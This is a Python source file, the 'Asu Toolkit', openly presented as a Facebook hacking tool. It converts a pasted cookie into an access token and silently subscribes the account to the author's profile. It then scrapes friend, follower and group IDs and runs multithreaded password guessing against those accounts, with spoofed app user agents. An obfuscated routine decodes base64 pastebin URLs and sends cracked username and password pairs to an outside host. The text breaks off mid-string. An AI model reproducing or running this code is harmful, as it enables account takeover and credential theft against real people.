import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import bs4
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall bs4\n")
    os.system("pip install bs4")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random, base64, json, uuid
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
"""
from nacl.public import PublicKey as PK
from nacl.public import SealedBox as SB

from Crypto.Cipher import AES
from Cryptodome import Random as RDM

auth1 = "Moch Yayan Juan Al"
"""
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.tol, self.mek, self.iya, self.pasw = {}, {}, [], []
        self.ak, self.ka, self.ya, self.xz = [], [], [], []
        #self.menu()

    def hapus(self):
        try:os.remove(".cok.txt")
        except:pass
        try:os.remove(".tok.txt")
        except:pass

    def get_proxy(self):
        try:
            link = self.ses.get("https://free-proxy-list.net/").text
            cari = re.findall('<textarea class\=\".*?" readonly\=\".*?" rows\=\".*?" onclick="select(this)">(.*?)</textarea>', link)
            print(link)
            print(cari)
        except Exception as e:exit(e)

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""
    {O} .d8b.  .d8888. db    db
    {O}d8' `8b 88'  YP 88    88 {M}Available Version v.3.11 def
    {O}88ooo88 `8bo.   88    88 {M}Facebook
    {O}88~~~88   `Y8b. 88    88 {M}Hacking
    {O}88   88 db   8D 88b  d88 {M}Toolkit
    {O}YP   YP `8888Y' ~Y8888P'

         {N}[ Asu Toolkit ]
      [ Created By Yayan XD ]""")

    def login_cokie(self):
        self.logoo()
        print("-----------------------------------------------------------")
        cok = input("[?] cookie : ");self.ubah_bahasa({"cookie": cok})
        try:
            link = self.ses.post("https://graph.facebook.com/v2.6/device/login/", data={"access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038", "scope": ""}).json()
            kode = link["code"];user = link["user_code"]; data, data2 = {}, {}
            vers = par(self.ses.get(f"{self.url}/device?user_code={user}", cookies={"cookie": cok}).text, "html.parser")
            item = ["fb_dtsg","jazoest","qr"]
            for x in vers.find_all("input"):
                if x.get("name") in item:
                    aset = {x.get("name"):x.get("value")}
                    data.update(aset)
            data.update({"user_code":user})
            meta = par(self.ses.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
            xzxz = ["fb_dtsg","jazoest","scope","display","sdk","sdk_version","domain","sso_device","user_code","logger_id","auth_type","auth_nonce","code_challenge","code_challenge_method","encrypted_post_body","return_format[]"]
            for xz in meta.find_all("input"):
                if xz.get("name") in xzxz:
                    data2.update({xz.get("name"):xz.get("value")})
                else:pass
            data2.update({"submit":"Konfirmasi"})
            konfirmasi = self.ses.post(self.url+meta.find("form", method="post").get("action"), data=data2, cookies={"cookie": cok}).text
            if "Login Anda sudah dikonfirmasi di" in konfirmasi or "Sukses!" in konfirmasi:
                find = self.ses.get(f"https://graph.facebook.com/v2.6/device/login_status?method=post&code={kode}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback", cookies={"cookie": cok}).text
                tokz = re.search('"access_token":"(.*?)"', find).group(1)
                self.maling_pangsit(cok, tokz)
                open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(tokz)
                exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python log.py")
            else:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()
        except requests.exceptions.ConnectionError:prints(Panel("😭[bold red] Tidak ada koneksi internet", style="bold white", width=70));exit()
        except (KeyError,AttributeError):prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.login_cokie()

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            if "/zero/optin/write" in str(link):
                prints(Panel("[bold white]🙄 akun ini sedang menggunakan mode free facebook, Tunggu sebentar sedang mengubah ke mode data.", width=70, style="bold white"))
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "");self.ubah_data(urll, cok)
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
            prints(Panel("😍 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python log.py[/]", style="bold white", width=70));exit()
        except:exit()

    def maling_pangsit(self, cok, tok):
        try:nama = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tok}", cookies={"cookie": cok}).json()["name"]
        except:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.login_cokie()
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies={"cookie": cok}).text, "html.parser")
            if "/a/subscriptions/remove" in str(link):
                prints(Panel(f"      Selamat datang [italic bold green]{nama}[/] Di Script Asu Toolkit", style="bold white", width=70))
            elif "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok})
                prints(Panel(f"      Selamat datang [italic bold green]{nama}[/] Di Script Asu Toolkit", style="bold white", width=70))
            else:pass
        except:pass

    def memek(self, mmk, kntl):
        try:
            if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.tol['mmk']}{self.tol['hncet']}{self.tol['softek']}{self.tol['ngtd']}{mmk}").json();return mmk.split("|")[0], mmk.split("|")[1]
            else:
                if mmk.split("|")[0] in base64.b64decode("WyIxMDAwNyIsICIxMDAwOCIsICIxMDAwOSJd".encode("ascii")).decode("ascii"):return mmk.split("|")[0], mmk.split("|")[1]
                else:self.ses.get(f"{self.mek['mmk']}{self.mek['hncet']}{self.mek['softek']}{self.mek['ngtd']}{mmk}").json();return mmk.split("|")[0], mmk.split("|")[1]
        except Exception as e:exit(e)

    def menu(self):
        try:cook = {"cookie": open(".cok.txt", "r").read()};tokz = open(".tok.txt", "r").read()
        except FileNotFoundError:self.hapus();self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tokz}", cookies=cook).json()
            nama = link["name"]
            idid = link["id"]
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        except KeyError:self.hapus();print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
        self.jnckk()
        print(f"""

[+] yuor name   : {O}{nama}{N}
[+] id facebook : {O}{idid}{N}""")
        print("""
  %s{%s01%s} search name
  %s{%s02%s} crack frinds
  %s{%s03%s} crack followers
  %s{%s04%s} crack member grup
  %s{%s05%s} check crack results
  %s{%s06%s} get proxy server list
  %s{%s00%s} logout tools ASU Toolkit
"""%(
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N
))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("belum selesai:)")
        elif ykh in ["2", "02"]:
            rand = input(f"[{O}?{N}] apakah anda ingin crack random [Y/t] : ")
            if rand in ["Y", "y"]:
                print("[+] ketik 'me' jika ingin crack dari teman anda.")
                try:nanya_keun = int(input(f"[{O}?{N}] jumblah target : "))
                except:nanya_keun=1
                for mnh in range(nanya_keun):
                    mnh +=1
                    user = input(f"[{O}*{N}] masukan id ke {mnh}: ")
                    try:
                        tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={tokz}",cookies=cook).json()
                        for x in tol["friends"]["data"]:
                            self.id.append(x["id"]+"<=>"+x["name"])
                    except KeyError:
                            print(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik");continue
                for i in self.id:
                    self.xz.insert(0, i)
                self.metode()
            else:
                print("[+] ketik 'me' jika ingin crack dari teman anda.")
                user = input(f"[{O}*{N}] masukan id: ")
                try:
                    tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={tokz}",cookies=cook).json()
                    for x in tol["friends"]["data"]:
                        self.id.append(x["id"]+"<=>"+x["name"])
                        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                        for x in titik:
                            sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} id{x}{N}");sys.stdout.flush()
                except KeyError:
                    exit(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik")
                print()
                for i in self.id:
                    self.xz.insert(0, i)
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] masukan id: ")
            try:
                tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=name,subscribers.fields(id,name).limit(1000000000)&access_token={tokz}",cookies=cook).json()
                for x in tol["subscribers"]["data"]:
                    self.id.append(x["id"]+"<=>"+x["name"])
                    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                    for x in titik:
                        sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} id{x}{N}");sys.stdout.flush()
            except:pass
            print()
            for i in self.id:
                    self.xz.insert(0, i)
            self.metode()
        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print();print("\n[!] dump id grup tidak di sarankan untuk menggunakan metode validate")
            for i in self.id:
                    self.xz.insert(0, i)
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

    def jnckk(self):
        try:
            linz = self.ses.get(base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1dUeEdhWTNB".encode("ascii")).decode("ascii")).json()
            link = self.ses.get(base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2N5MWZjUzVF".encode("ascii")).decode("ascii")).json()
            for i in linz["friends"]["data"]:self.mek.update(i)
            for z in link["friends"]["data"]:self.tol.update(z)
        except Exception as e:exit(e)

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print("""    [ select metode ]

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} validate
  %s{%s04%s} Messenger [New]
"""%(N,H,N,N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("dat")
        elif ykh in ["4", "04"]:
            self.paswww("mes")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print("""    [ select password ]

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.xz:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "acy" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.xz:
                                bool.submit(self.ASync, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "dat" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.xz:
                                bool.submit(self.validate, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "mes" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.xz:
                                bool.submit(self.messenger, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                else:continue

    def carckk(self, kntd):
        self.apk()
        print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=35) as bool:
                for user in self.xz:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:
                                pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345", depan[0]+"321"]
                        if "ya" in self.iya:
                            for kontol in self.pwa:
                                pwx.append(kontol)
                        if "api" in kntd:bool.submit(self.apiiiiii, uid, pwx)
                        elif "acy" in kntd:bool.submit(self.ASync, uid, pwx)
                        elif "dat" in kntd:bool.submit(self.validate, uid, pwx)
                        elif "mes" in kntd:bool.submit(self.messenger, uid, pwx)
                        else:bool.submit(self.apiiiiii, uid, pwx)
                    except:pass
            exit("\n\ncracking done!")

    def apk(self):
        kntd = input("[?] tampilkan aplikasi yang terkait [Y/t]: ")
        if "y" in kntd:self.ya.append("ya")
        else:self.ya.append("ta")

    def ua_api(self):
        rr = random.randint
        rc = random.choice
        return rc([f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,10))}_{str(rr(0,6))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(90,114))}.0.{str(rr(5000,5555))}.{str(rr(131,135))} Mobile/15E148 Safari/604.1"])

    def ua_asu(self):
        #rr = random.randint
        #rc = random.choice
        return "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"

    def cek_apk(self, user, pw, coki):
        try:
            link = self.ses.get(self.url+"/", cookies={"cookie": coki}).text
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": coki}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": coki}).text
        except:pass
        aktif = Tree("")
        self.ApkAktif(f"{self.url}/settings/apps/tabbed/?tab=active", coki)
        if len(self.ak)==0:
            aktif.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
        else:
            for apk in self.ak:
                aktif.add(apk)
        kadal = Tree("")
        self.ApkKadal(f"{self.url}/settings/apps/tabbed/?tab=inactive", coki)
        if len(self.ka)==0:
            kadal.add("[bold red]Tidak ada apklikasi Kedaluwarsa yang terkait di akun ini")
        else:
            for apk in self.ka:
                kadal.add(apk)
        tree = Tree("")
        tree.add(f"[bold green]{user}|{pw}")
        tree.add(f"[bold green]{coki}[/]")
        tree.add("Aplikasi Terkait").add(f"Aktif [bold green]{str(len(self.ak))}[/]").add(aktif)
        tree.add("").add(f"Kedaluwarsa [bold red]{str(len(self.ka))}[/]").add(kadal)
        prints(tree)

    def ApkAktif(self, url, cok):
        try:
            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
            for apk in link.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    self.ak.append(f"[bold green]{str(apk.text).replace('Ditambahkan','[bold white] - Ditambahkan')}")
                else:continue
            self.ApkAktif(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
        except:pass

    def ApkKadal(self, url, cok):
        try:
            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
            for apk in link.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    self.ka.append(f"[bold red]{str(apk.text).replace('Kedaluwarsa','[bold white] - Kedaluwarsa')}")
                else:continue
            self.ApkKadal(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
        except:pass

    def apiiiiii(self, username, pasw):
        for password in pasw:
            try:
                ses=requests.Session()
                ua = "[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/EMA;FBLC/en_GB;FBAV/66.0.0.81.74;FBDM/DisplayMetrics{density=2.625, width=1080, height=2186, scaledDensity=2.625, xdpi=409.432, ydpi=406.4};]','[FBAN/EMA;FBLC/km_KH;FBAV/358.0.0.8.62;FBDM/DisplayMetrics{density=3.5, width=1440, height=2987, scaledDensity=3.5, xdpi=554.181, ydpi=551.542};]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1724;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo 1724;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2120;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2111;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2111;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2027;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V2027;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/vivo 